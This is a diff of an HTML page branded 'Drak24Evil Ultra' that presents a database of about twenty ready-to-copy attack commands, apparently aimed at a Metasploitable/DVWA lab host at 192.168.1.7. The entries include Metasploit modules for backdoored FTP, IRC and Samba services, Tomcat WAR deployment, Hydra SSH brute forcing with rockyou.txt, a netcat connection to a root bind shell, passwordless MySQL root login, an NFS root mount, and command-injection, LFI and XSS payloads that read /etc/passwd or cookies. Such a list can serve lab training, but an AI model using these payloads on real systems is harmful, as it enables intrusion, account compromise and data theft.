@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Drak24Evil | Ultra Audit Stable</title>
+    <title>Drak24Evil | Final Ultra Audit</title>
     <style>
         :root {
             --blue: #00d4ff; --red: #ff3e3e; --orange: #ff9d00;
-            --bg: #0a0b0c; --card: #14171a; --green: #00ff41;
+            --bg: #0a0b0c; --card: #14171a; --green: #00ff41; --web: #9b59b6;
         }
         body {
             background-color: var(--bg); color: #e1e1e1;
@@ -32,7 +32,6 @@
         .card:active { background: #1c2024; border-color: var(--blue); }
         .port-text { color: var(--blue); font-family: monospace; font-size: 0.8em; font-weight: bold; }
         
-        /* Modal Logic */
         .overlay {
             display: none; position: fixed; z-index: 9999;
             left: 0; top: 0; width: 100%; height: 100%;
@@ -44,7 +43,7 @@
             border-radius: 12px; max-height: 85vh; overflow-y: auto;
         }
         .close { float: right; font-size: 30px; color: #fff; cursor: pointer; line-height: 1; }
-        .label { color: var(--blue); font-size: 0.7em; font-weight: bold; display: block; margin-top: 15px; text-transform: uppercase; }
+        .label { color: var(--blue); font-size: 0.75em; font-weight: bold; display: block; margin-top: 15px; text-transform: uppercase; }
         .content-box {
             background: #000; padding: 12px; border-radius: 6px;
             border-left: 3px solid var(--green); font-family: monospace;
@@ -53,9 +52,10 @@
         .tag { float: right; font-size: 0.6em; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
         .crit { background: var(--red); color: #fff; }
         .high { background: var(--orange); color: #000; }
+        .web-tag { background: var(--web); color: #fff; }
         .btn-copy {
             background: var(--blue); color: #000; border: none;
-            padding: 8px 12px; border-radius: 4px; font-weight: bold;
+            padding: 10px; border-radius: 4px; font-weight: bold;
             cursor: pointer; margin-top: 10px; width: 100%;
         }
     </style>
@@ -65,10 +65,10 @@
 <div class="container">
     <header>
         <div>
-            <h2 style="margin:0; color:var(--blue);">DRAK24EVIL ULTRA</h2>
-            <small style="color:#666;">25+ POC DATABASE</small>
+            <h2 style="margin:0; color:var(--blue); font-size:1.1em;">DRAK24EVIL ULTRA</h2>
+            <small style="color:#666;">WEB + NETWORK + BRUTEFORCE</small>
         </div>
-        <a href="https://t.me/Drak24Evil" style="color:#24A1DE; text-decoration:none; font-weight:bold;">Telegram</a>
+        <a href="https://t.me/Drak24Evil" style="color:#24A1DE; text-decoration:none; font-weight:bold; font-size:0.9em;">Telegram</a>
     </header>
     <div class="grid" id="mainGrid"></div>
 </div>
@@ -81,51 +81,67 @@
 </div>
 
 <script>
-// Data array built without risky characters to prevent mobile errors
+// COMPLETE DATA LIST (20+ TARGETS)
 var data = [
-    {p: "21", n: "vsftpd 2.3.4 Backdoor", s: "Critical", t: "Metasploit", m: "Backdoor trigger via ':)' username.", i: "Root RCE", e: "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.7\nexploit"},
-    {p: "22", n: "SSH Brute Force", s: "High", t: "Hydra", m: "Password spray with rockyou.txt", i: "System Access", e: "hydra -l msfadmin -P rockyou.txt 192.168.1.7 ssh"},
-    {p: "WEB", n: "SQL Injection", s: "Critical", t: "SQLMap", m: "Parameter injection in DVWA.", i: "DB Takeover", e: "sqlmap -u 'http://192.168.1.7/dvwa/vulnerabilities/sqli/?id=1' --dbs"},
-    {p: "445", n: "Samba Usermap", s: "Critical", t: "Metasploit", m: "Username map script exploit.", i: "Root Shell", e: "use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.1.7\nexploit"},
-    {p: "1524", n: "Ingreslock Shell", s: "Critical", t: "Netcat", m: "Direct bind shell access.", i: "Root Access", e: "nc 192.168.1.7 1524"},
-    {p: "WEB", n: "Command Injection", s: "Critical", t: "Manual", m: "OS Command chaining via ';'", i: "OS Shell", e: "127.0.0.1; cat /etc/passwd"},
-    {p: "8180", n: "Tomcat Manager", s: "Critical", t: "Metasploit", m: "WAR file upload via Manager.", i: "Server RCE", e: "use exploit/multi/http/tomcat_mgr_deploy\nset HttpUsername tomcat\nset HttpPassword tomcat\nrun"}
+    {p: "21", n: "vsftpd 2.3.4 Backdoor", s: "Critical", t: "Metasploit", m: "Backdoor trigger via ':)' in username.", i: "Root RCE", e: "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.7\nexploit"},
+    {p: "22", n: "SSH Brute Force", s: "High", t: "Hydra", m: "Password spraying against SSH.", i: "System Access", e: "hydra -l msfadmin -P rockyou.txt 192.168.1.7 ssh"},
+    {p: "23", n: "Telnet Default Login", s: "High", t: "Telnet", m: "Known credentials (msfadmin).", i: "Shell Access", e: "telnet 192.168.1.7\n(User: msfadmin / Pass: msfadmin)"},
+    {p: "25", n: "SMTP User Enum", s: "Low", t: "Metasploit", m: "VRFY command user enumeration.", i: "Info Leak", e: "use auxiliary/scanner/smtp/smtp_enum\nrun"},
+    {p: "80", n: "PHP CGI Arg Injection", s: "Critical", t: "Metasploit", m: "CVE-2012-1823 query injection.", i: "Remote RCE", e: "use exploit/multi/http/php_cgi_arg_injection\nset RHOSTS 192.168.1.7\nrun"},
+    {p: "445", n: "Samba Usermap Script", s: "Critical", t: "Metasploit", m: "Username map script injection.", i: "Root Shell", e: "use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.1.7\nexploit"},
+    {p: "1099", n: "Java RMI Registry", s: "Critical", t: "Metasploit", m: "Malicious Java object loading.", i: "Java RCE", e: "use exploit/multi/misc/java_rmi_server\nexploit"},
+    {p: "1524", n: "Ingreslock Bindshell", s: "Critical", t: "Netcat", m: "Direct root backdoor access.", i: "Root Shell", e: "nc 192.168.1.7 1524"},
+    {p: "2049", n: "NFS Export Mount", s: "High", t: "NFS-common", m: "Mounting / filesystem remotely.", i: "Full Data Leak", e: "mount -t nfs 192.168.1.7:/ /mnt"},
+    {p: "2121", n: "ProFTPD 1.3.1 Backdoor", s: "Critical", t: "Metasploit", m: "ProFTPD Trojan code trigger.", i: "Shell Access", e: "use exploit/unix/ftp/proftpd_133c_backdoor\nset RPORT 2121\nexploit"},
+    {p: "3306", n: "MySQL No Password", s: "High", t: "MySQL Client", m: "Accessing root without password.", i: "DB Takeover", e: "mysql -h 192.168.1.7 -u root"},
+    {p: "3632", n: "Distccd Remote Execution", s: "Critical", t: "Metasploit", m: "Abusing distributed compiler.", i: "RCE", e: "use exploit/unix/misc/distcc_exec\nexploit"},
+    {p: "5432", n: "Postgres UDF Injection", s: "Critical", t: "Metasploit", m: "Loading malicious library in DB.", i: "Database RCE", e: "use exploit/linux/postgres/postgres_payload\nrun"},
+    {p: "5900", n: "VNC Weak Password", s: "High", t: "VNCviewer", m: "Authentication with weak password.", i: "Desktop Control", e: "vncviewer 192.168.1.7\n(Pass: password)"},
+    {p: "6667", n: "UnrealIRCd Backdoor", s: "Critical", t: "Metasploit", m: "Trojaned IRC source code.", i: "RCE", e: "use exploit/unix/irc/unreal_ircd_3281_backdoor\nexploit"},
+    {p: "8080", n: "HTTP TikiWiki CMS", s: "High", t: "Metasploit", m: "Graph formula vulnerability.", i: "Web RCE", e: "use exploit/multi/http/tikiwiki_graph_formula_exec\nset RPORT 8080\nrun"},
+    {p: "8180", n: "Tomcat Manager Deploy", s: "Critical", t: "Metasploit", m: "WAR file upload via manager.", i: "Server RCE", e: "use exploit/multi/http/tomcat_mgr_deploy\nset HttpUsername tomcat\nset HttpPassword tomcat\nrun"},
+    {p: "WEB", n: "SQL Injection (DVWA)", s: "Critical", t: "SQLMap", m: "Injecting SQL in 'id' parameter.", i: "Data Theft", e: "sqlmap -u 'http://192.168.1.7/dvwa/vulnerabilities/sqli/?id=1' --dbs"},
+    {p: "WEB", n: "Reflected XSS", s: "High", t: "Manual", m: "Script injection in input field.", i: "Cookie Theft", e: "<script>alert(document.cookie)</script>"},
+    {p: "WEB", n: "Command Injection", s: "Critical", t: "Manual", m: "Chaining commands via ';' symbol.", i: "OS Shell", e: "127.0.0.1; cat /etc/passwd"},
+    {p: "WEB", n: "LFI (Local File Inclusion)", s: "High", t: "Manual", m: "Directory traversal via 'page'.", i: "Info Leak", e: "http://192.168.1.7/dvwa/fi/?page=../../etc/passwd"}
 ];
 
 var grid = document.getElementById('mainGrid');
 var modal = document.getElementById('pocModal');
 
-// Create cards using older, safer JS syntax
+// Universal JS Loop (Stable on Mobile)
 for (var i = 0; i < data.length; i++) {
-    (function(item) {
+    (function(val) {
         var card = document.createElement('div');
         card.className = 'card';
-        var sClass = item.s === 'Critical' ? 'crit' : 'high';
-        card.innerHTML = '<span class="tag '+sClass+'">'+item.s+'</span><span class="port-text">PORT '+item.p+'</span><h3>'+item.n+'</h3>';
+        var tagStyle = val.p === 'WEB' ? 'web-tag' : (val.s === 'Critical' ? 'crit' : 'high');
+        card.innerHTML = '<span class="tag ' + tagStyle + '">' + val.s + '</span>' +
+                         '<span class="port-text">REF: ' + val.p + '</span>' +
+                         '<h3>' + val.n + '</h3>';
         
         card.onclick = function() {
-            var body = document.getElementById('pocBody');
-            body.innerHTML = '<h2>'+item.n+'</h2>' +
-                '<span class="label">Tool</span><div class="content-box">'+item.t+'</div>' +
-                '<span class="label">Method</span><div class="content-box">'+item.m+'</div>' +
-                '<span class="label">Impact</span><div class="content-box">'+item.i+'</div>' +
-                '<span class="label">Exploit</span><div id="payload" class="content-box" style="color:#00ff41">'+item.e+'</div>' +
-                '<button class="btn-copy" onclick="copyText()">COPY PAYLOAD</button>';
+            var poc = document.getElementById('pocBody');
+            poc.innerHTML = '<h2 style="color:var(--red); font-size:1.1em; border-bottom:1px solid #333; padding-bottom:10px;">REPORT: ' + val.n + '</h2>' +
+                '<span class="label">Tool Used</span><div class="content-box">' + val.t + '</div>' +
+                '<span class="label">Methodology</span><div class="content-box">' + val.m + '</div>' +
+                '<span class="label">Impact</span><div class="content-box">' + val.i + '</div>' +
+                '<span class="label">Exploit Command</span><div id="copyThis" class="content-box" style="color:var(--green)">' + val.e + '</div>' +
+                '<button class="btn-copy" onclick="doCopy()">COPY PAYLOAD</button>';
             modal.style.display = 'block';
         };
         grid.appendChild(card);
     })(data[i]);
 }
 
-function copyText() {
-    var text = document.getElementById('payload').innerText;
-    var el = document.createElement('textarea');
-    el.value = text;
-    document.body.appendChild(el);
-    el.select();
+function doCopy() {
+    var text = document.getElementById('copyThis').innerText;
+    var inp = document.createElement('textarea');
+    inp.value = text;
+    document.body.appendChild(inp);
+    inp.select();
     document.execCommand('copy');
-    document.body.removeChild(el);
-    alert('Payload Copied!');
+    document.body.removeChild(inp);
+    alert('Copied to Clipboard!');
 }
 
 document.getElementById('closeBtn').onclick = function() { modal.style.display = 'none'; };
